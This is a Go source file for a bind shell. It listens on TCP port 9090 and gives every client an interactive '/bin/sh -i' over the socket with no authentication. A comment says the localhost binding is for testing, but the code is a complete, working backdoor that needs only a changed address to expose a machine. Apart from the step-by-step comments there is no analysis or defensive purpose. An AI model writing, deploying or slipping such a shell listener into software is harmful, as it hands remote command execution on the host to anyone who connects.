package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func handler(pxy net.Conn) {
	defer pxy.Close()
	// Executes the sh shell on interactive mode
	cmd := exec.Command("/bin/sh", "-i")
	// Creates read and write pipes for sync communications
	rp, wp := io.Pipe()
	// shell's input comes from TCP connection
	cmd.Stdin = pxy
	// shell's output goes to writer pipe, which is connected to
	// reader pipe
	cmd.Stdout = wp
	// Reader pipe's data goes back to TCP connection
	go io.Copy(pxy, rp)
	// Run command
	cmd.Run()
}

func main() {
	// Bind to 9090/tcp port on localhost for testing purposes
	pxy := "localhost:9090"
	listener, err := net.Listen("tcp", pxy)
	if err != nil {
		log.Fatalln("Unable to bind pid to port")
	}
	// Ready to accept client connections
	log.Printf("Listening on %s\n", pxy)

	// Handle client connections on separate goroutines
	for {
		conn, err := listener.Accept()
		log.Println("Connection attempt received")
		if err != nil {
			log.Println("Failed to accept connection")
		}
		go handler(conn)
	}
}
